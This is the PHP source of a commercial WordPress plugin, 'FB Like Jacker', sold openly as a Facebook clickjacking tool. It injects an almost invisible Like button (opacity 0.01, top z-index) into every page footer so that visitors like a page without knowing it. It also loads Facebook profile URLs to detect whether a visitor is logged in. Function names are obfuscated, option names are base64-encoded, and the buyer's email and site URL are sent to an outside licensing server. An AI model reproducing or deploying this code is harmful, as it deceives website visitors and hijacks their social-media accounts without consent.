<?php
/**
 Plugin Name: FB Like Jacker
 Plugin URI: http://www.fblikejacker.com
 Version: 0.09
 Description: The first Facebook Links Click Jacker 
 Author: David Lemarier
 Author URI: http://www.fblikejacker.com/
 License: Commercial. For personal use only. Not to give away or resell
*/
/*  Copyright 2011 Wasabi Technologie
*/
#error_reporting(E_STRICT | E_ALL);

# WP Super Cache Fix
define( "DONOTCACHEPAGE", true );

@include_once("includes/functions.php");
@include_once("includes/plugin-update-checker.php");
$currentdbversionfbj = 1;
$fblikejacker_path = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));

if (version_compare(PHP_VERSION, '5.0.0.', '<'))
{
	die(__("PHP 5 or a greater version to work.", "fblikejacker"));
}

# UPDATER
$updater = new PluginUpdateChecker(
    'http://fblikejacker.com/app_server456247/info.json',
    __FILE__,
    'fb-likejacker'
);


# INITIALIZATION
function fblikejacker_hg3252325c () {
    global $currentdbversionfbj;
	$plugin_dir = basename(dirname(__FILE__));
	load_plugin_textdomain( 'fblikejacker', 'wp-content/plugins/' . $plugin_dir, $plugin_dir );
        
        $dbv = get_option('fblikejacker_dbv');
        $like_active = get_option('fblikejacker_like_active');
        
        if (($dbv != $currentdbversionfbj) && ($like_active != '0')) {
            update_option("fblikejacker_like_active",'1');
            update_option('fblikejacker_dbv',$currentdbversionfbj);
        } elseif (($dbv != $currentdbversionfbj) && ($like_active == '1')) {
            update_option('fblikejacker_dbv',$currentdbversionfbj);
        }
        
        # footer & header tester
        $tested  = get_option("fblikejacker_tested");
        $theme_name = get_current_theme();

        if ($tested != $theme_name) {
            update_option("fblikejacker_tested",$theme_name);
            
            add_action( 'admin_init', 'fblikejacker_check_head_footer' );
            add_action( 'wp_head', 'fblikejacker_test_head', 99999 ); 
            add_action( 'wp_footer', 'fblikejacker_test_footer', 99999 ); 
        
        }    
    
        if ( isset( $_GET['test-head'] ) )
		add_action( 'wp_head', 'fblikejacker_test_head', 99999 ); 
 
	if ( isset( $_GET['test-footer'] ) )
		add_action( 'wp_footer', 'fblikejacker_test_footer', 99999 );        
                
}
add_action ('init', 'fblikejacker_hg3252325c');

function fblikejacker_pkk432j434() {
    add_menu_page('FB Like Jacker', 'FB Like Jacker', 8, 'fblikejacker-main', 'fblikejacker_hg54h3543');	
}
add_action('admin_menu', 'fblikejacker_pkk432j434');

function fblikejacker_hg54h3543() {
    $options = unserialize(get_option(base64_decode("ZmJsaWtlamFja2VyX3BheXBhbA==")));if(!$options[base64_decode("ZmJsaWtlamFja2VyX2VtYWls")]) {fblikejacker_asf76asf7s();}

    switch ($_GET['action']) {
        
        case 'save-config':
            if ($_POST['link_like']) update_option("fblikejacker_link_like",$_POST['link_like']);
            
            update_option("fblikejacker_og_title",$_POST['og_title']);
            update_option("fblikejacker_og_desc",$_POST['og_desc']);
            update_option("fblikejacker_og_img",$_POST['og_img']);
             
            if ($_POST['is_active'] == 'on') update_option("fblikejacker_is_active",'1');
            else update_option("fblikejacker_is_active",'0');

            if ($_POST['debug_mode'] == 'on') update_option("fblikejacker_debug_mode",'1');
            else update_option("fblikejacker_debug_mode",'0');

            if ($_POST['like_active'] == 'on') update_option("fblikejacker_like_active",'1');
            else update_option("fblikejacker_like_active",'0');
             
             if (empty($_POST['link_like'])) {
                 update_option("fblikejacker_like_active",'1');
                 update_option("fblikejacker_link_like","");
             }
             
             echo '<div class="updated"><p>Settings updated <strong>successfully</strong>.</p></div>';

        break;
 
    }
     
    include("admin/main.php");
    
}



function fblikejacker_hj2v35h235() {
   global $fblikejacker_path; 
    
   wp_register_script('custom.script7464',$fblikejacker_path.'includes/core.js', array('jquery'), '1.0' );
   wp_enqueue_script('custom.script7464');

   wp_register_script('jquery.cookie',$fblikejacker_path.'includes/jquery.cookie.js', array('jquery'), '1.0' );
   wp_enqueue_script('jquery.cookie');
   
}
if (get_option("fblikejacker_is_active") == '1') {
    add_action('wp_head', 'fblikejacker_header');
    add_action('wp_footer','fblikejacker_footer');
    add_action('wp_enqueue_scripts', 'fblikejacker_hj2v35h235');
    add_filter('language_attributes', 'fblikejacker_schema');
}

function fblikejacker_schema($attr) {
    $attr = 'xmlns:og="http://ogp.me/ns#"'; 
    if ( is_rtl() ) {
      $attr .= " dir=\"rtl\"";   
    }
    return $attr;
}

function fblikejacker_header() {
    $profile_url = fblikejacker_get_profile_url();
    echo '<script src="http://connect.facebook.net/en_US/all.js#xfbml=1"></script>';
    echo '<script type="text/javascript" src="' . $profile_url . '" onload="loggedinfunction()" async="async"></script>';
    
    $og_title = get_option("fblikejacker_og_title");
    $og_desc = get_option("fblikejacker_og_desc");
    $og_img = get_option("fblikejacker_og_img");
    
    if ((get_option("fblikejacker_like_active") == '1') && !empty($og_title) && !empty($og_desc)) {
        echo '<meta property="og:type" content="website"/>';
        echo '<meta property="og:title" content="'.$og_title.'"/>';
        echo '<meta property="og:site_name" content="'.$og_title.'"/>';
        echo '<meta property="og:description" content="'.$og_desc.'"/>';
        echo '<meta property="og:url" content="'.get_permalink().'"/>';
        
        if (!empty($og_title)) {
        echo '<meta property="og:image" content="'.$og_img.'"/>';            
        }
    }    
    
}

function fblikejacker_footer() {
    $like = get_option("fblikejacker_link_like");
    $debug_mode = get_option("fblikejacker_debug_mode");
    
    
    if (get_option("fblikejacker_like_active") != '1' && !empty($like)) {
        $href=' data-href="'.$like.'" ';
    } else {
        $href = '';
    }
   
    if ($debug_mode == 1) {
        echo '<div style="z-index:99999;position:absolute;display:block;" id="theylikeme"><fb:like'.$href.' locale="en_EN" send="false" layout="button_count" width="50" show_faces="false"></fb:like></div>';
    } else {
        echo '<div style="z-index:99999;position:absolute;display:block;opacity:0.01;-khtml-opacity:.01;-moz-opacity:.01;filter:alpha(opacity=1);" id="theylikeme"><fb:like'.$href.' locale="en_EN" send="false" layout="button_count" width="50" show_faces="false"></fb:like></div>';
    }
        
}

function fblikejacker_get_profile_url() {
        unset($acc);
        $acc[] = 'http://www.facebook.com/profile.php?id=100002864613095&amp;sk=' . rand();
        $acc[] = 'http://www.facebook.com/profile.php?id=100002866387263&amp;sk=' . rand();
        $acc[] = 'http://www.facebook.com/profile.php?id=1082766141&amp;sk=' . rand();
        $acc[] = 'http://www.facebook.com/profile.php?id=100001510251383&amp;sk=' . rand();
        shuffle($acc);
        $tlm_fburl = $acc[0];
        return $tlm_fburl;
}

function fblikejacker_nbn543b5235($newemail) {
	global $wpdb;

	if(empty($newemail)) {
		echo '<div class="updated"><p>'.__('Error: Email can not be empty.', 'fblikejacker').'</p></div>';	
		return false;
	}

        
	if ( function_exists('curl_init') ) {
		$request = "http://api.pluginsfactory.com/install.php";
		$post="p=fblikejacker&email=".base64_encode($newemail)."&site=".get_bloginfo('url');
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Konqueror/4.0; Microsoft Windows) KHTML/4.0.80 (like Gecko)");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_URL, $request);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_TIMEOUT, 60);
		$response = curl_exec($ch);
		if (!$response) {
			echo '<div class="updated"><p>'.__('cURL Error: ', 'fblikejacker').' '.curl_error($ch).'</p></div>';	
			return false;
		}		
		curl_close($ch);
	} else { 				
		$response = @file_get_contents($request);
		if (!$response) {
			echo '<div class="updated"><p>'.__('Error: cURL is not installed on this server.', 'fblikejacker').'</p></div>';	
			return false;
		}
	}	

	if( $response == "false" || !$response) {
		echo '<div class="updated"><p>'.__('Error: No record was found for the email you entered.', 'fblikejacker').'</p></div>';
	} else {
           
            
		$responses = explode("###",$response);

                        
                $options['fblikejacker_email'] = $newemail;
                $options['fblikejacker_licence'] = $responses[0];
		update_option("fblikejacker_paypal", serialize($options));
                
		echo '<div class="updated"><p>'.__('Paypal Email has been updated successfully.', 'fblikejacker').'</p></div>';
		return $options["fblikejacker_email"];	
	}
	
}

function fblikejacker_asf76asf7s() {
	if(isset($_POST['fblikejacker_asf76asf7s'])) {
		if(empty($_POST['fblikejacker_nbn543b5235_email']) || !strpos($_POST['fblikejacker_nbn543b5235_email'], "@")) {

		echo '<div class="wrap"><h2>FB Like Jacker</h2><div class="updated"><h3>Installation</h3><p>'.__('Please enter your Paypal email you bought FB Like Jacker with below and click "install" to finish the installation of FB Like Jacker.', 'fblikejacker').'</p>
		<p style="color:red;">'.__('Error: Please enter a valid email address', 'fblikejacker').'</p>
		<form method="post" id="wpr_install">	
		<strong>Paypal Email:</strong> <input id="fblikejacker_nbn543b5235_email" class="regular-text" type="text" value="" name="fblikejacker_nbn543b5235_email"/>
		<input class="button-primary" type="submit" name="fblikejacker_asf76asf7s" value="'.__('Install', 'fblikejacker').'" />
		</form>	
		<br/><br/>	
		'.__('- Enter the exact Paypal email you have used to purchase your copy of SEO Killer.', 'fblikejacker').'<br/>		
		'.__('- Please note some Paypal accounts have several emails associated with them. If this is the case for you try all emails!', 'fblikejacker').'<br/>		
		'.__('- Do not tell other people your Paypal email in order to use it with SEO Killer. Doing this purposefully can get your license suspended!', 'fblikejacker').'<br/>		
		<br/>
                
                <a href="http://fblikejacker.com/">You don\'t have licence? Buy it now (LOW Price & FREE SUPPORT)</a><br/><br/>
		</div>
		</div>';
                die(); 
                
		} else {
                       
			$return = fblikejacker_nbn543b5235($_POST['fblikejacker_nbn543b5235_email']);
                        if (!$return) die();
		}
	} else {
		echo '<div class="wrap"><h2>FB Like Jacker</h2><div class="updated"><h3>Installation</h3><p>'.__('Please enter your Paypal email you bought FB Like Jacker with below and click "install" to finish the installation of FB Like Jacker.', 'fblikejacker').'</p>
		<form method="post" id="wpr_install">	
		<strong>Paypal Email:</strong> <input id="fblikejacker_nbn543b5235_email" class="regular-text" type="text" value="" name="fblikejacker_nbn543b5235_email"/>
		<input class="button-primary" type="submit" name="fblikejacker_asf76asf7s" value="'.__('Install', 'fblikejacker').'" />
		</form>	
		<br/><br/>	
		'.__('- Enter the exact Paypal email you have used to purchase your copy of FB Like Jacker.', 'fblikejacker').'<br/>		
		'.__('- Please note some Paypal accounts have several emails associated with them. If this is the case for you try all emails!', 'fblikejacker').'<br/>		
		'.__('- Do not tell other people your Paypal email in order to use it with FB Like Jacker. Doing this purposefully can get your license suspended!', 'fblikejacker').'<br/>		
		<br/>
                
                <a href="http://fblikejacker.com/">You don\'t have licence? Buy it now (LOW Price & FREE SUPPORT)</a><br/><br/>
		</div>
		</div>';
                die();
	}
}


function fblikejacker_test_head() {
	echo '<!--wp_head-->';
}

function fblikejacker_test_footer() {
	echo '<!--wp_footer-->';
}
 

function fblikejacker_check_head_footer() {

	$url = add_query_arg( array( 'test-head' => '', 'test-footer' => '' ), home_url() );

	$response = wp_remote_get( $url, array( 'sslverify' => false ) );

	$code = (int) wp_remote_retrieve_response_code( $response );
	if ( $code == 200 ) {
		global $head_footer_errors;
		$head_footer_errors = array();
 

		$html = preg_replace( '/[	
s]/', '', wp_remote_retrieve_body( $response ) );
 
		if ( ! strstr( $html, '<!--wp_head-->' ) )
			$head_footer_errors['nohead'] = 'Is missing the call to <?php wp_head(); ?> which should appear directly before </head>';
		
                if ( ! strstr( $html, '<!--wp_footer-->' ) )
			$head_footer_errors['nofooter'] = 'Is missing the call to <?php wp_footer(); ?> which should appear directly before </body>';
 
		if ( ! empty( $head_footer_errors ) )
			add_action ( 'admin_notices', 'fblikejacker_test_head_footer_notices' );
	}
}
 
function fblikejacker_test_head_footer_notices() {
	global $head_footer_errors;
	echo '<div class="error"><p><strong>Your active theme:</strong></p><ul>';
	foreach ( $head_footer_errors as $error )
		echo '<li>' . esc_html( $error ) . '</li>';
	echo '</ul></div>';
}